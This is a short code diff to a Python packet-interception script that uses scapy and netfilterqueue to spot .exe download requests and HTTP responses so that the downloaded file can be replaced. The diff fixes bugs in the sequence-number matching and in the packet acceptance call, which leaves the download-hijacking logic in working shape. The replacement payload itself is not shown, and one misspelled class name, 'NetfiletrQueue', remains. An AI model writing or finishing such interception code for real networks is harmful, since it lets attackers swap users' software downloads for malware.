@@ -14,11 +14,12 @@ def process_packet(packet):
                 print("[+] .exe Request file requested")
                 print(my_packet.show())
         elif my_packet[scapy.TCP].sport == 80:
-            if my_packet[scapy.tcp].sec in ack_list:
+            if my_packet[scapy.TCP].seq in ack_list:
+                ack_list.remove(my_packet[scapy.TCP].seq)
                 print("[+] Replacing download file...")
                 print(my_packet.show())
 
-    packt.accept()
+    packet.accept()
 
 
 queue = netfilterqueue.NetfiletrQueue()
